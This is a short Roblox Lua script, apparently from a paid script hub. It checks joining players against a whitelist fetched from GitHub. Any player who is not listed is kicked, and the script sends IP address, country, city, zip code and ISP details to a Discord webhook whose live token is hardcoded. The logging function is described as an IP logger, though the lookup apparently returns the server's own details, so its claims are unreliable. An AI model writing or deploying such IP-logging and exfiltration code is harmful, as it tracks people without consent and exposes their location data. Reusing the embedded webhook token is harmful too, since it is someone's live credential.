local HttpService = game:GetService("HttpService")

-- Function to fetch the whitelist from GitHub
local function getWhitelist()
    -- GitHub raw URL for the whitelist
    local whitelistUrl = "https://raw.githubusercontent.com/Marwanleprodu91670/Nova-Hub-Paid-/refs/heads/main/Whitelist"
    
    -- Try to fetch the whitelist data
    local success, response = pcall(function()
        return HttpService:GetAsync(whitelistUrl)
    end)
    
    if success then
        -- Split the response into a table of player names (handle extra spaces and newlines)
        local whitelist = {}
        
        -- Find the block of the whitelist starting after "whitelisted users ="
        local startIdx = string.find(response, "whitelisted users =")
        if startIdx then
            local whitelistData = string.sub(response, startIdx + 19) -- Skip the "whitelisted users =" part
            for line in string.gmatch(whitelistData, '"([^"]+)"') do
                table.insert(whitelist, line)  -- Insert player names into the whitelist
            end
        end
        
        return whitelist
    else
        warn("Failed to fetch the whitelist from GitHub.")
        return {}
    end
end

-- Function to check if the player is whitelisted
local function isPlayerWhitelisted(playerName, whitelist)
    for _, whitelistedName in ipairs(whitelist) do
        if playerName == whitelistedName then
            return true
        end
    end
    return false
end

-- Function to log IP and send it to a Discord webhook
local function logIPAndKick(playerName)
    local webhookUrl = "https://discord.com/api/webhooks/1349003238032146562/XC8Qj148wx-fnQb9D3NONxLgOqZbbvUAvrCtPT95D2_gJSf7ZiGZshRNLtYNtURaZIMe"

    -- Fetch IP information
    local ip_info = HttpService:GetAsync("http://ip-api.com/json")
    local ipinfo_table = HttpService:JSONDecode(ip_info)

    -- Format the message to send to the webhook
    local dataMessage = string.format(
        "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",
        playerName, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode,
        ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip,
        ipinfo_table.isp, ipinfo_table.org
    )

    -- Send the data to the Discord webhook
    local success, err = pcall(function()
        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode({["content"] = dataMessage}), Enum.HttpContentType.ApplicationJson)
    end)

    if not success then
        warn("Failed to send data to webhook: " .. err)
    end
end

-- Player added event to check if the player is whitelisted
game.Players.PlayerAdded:Connect(function(player)
    local playerName = player.Name
    local whitelist = getWhitelist()  -- Get the whitelist from GitHub

    -- Check if the player is in the whitelist
    if isPlayerWhitelisted(playerName, whitelist) then
        print("Hello World, " .. playerName)  -- If whitelisted, print "Hello World"
    else
        -- If not whitelisted, log IP and kick the player
        logIPAndKick(playerName)  -- Send IP info to Discord
        player:Kick("You Are Not Whitelisted")  -- Kick the player with a message
    end
end)
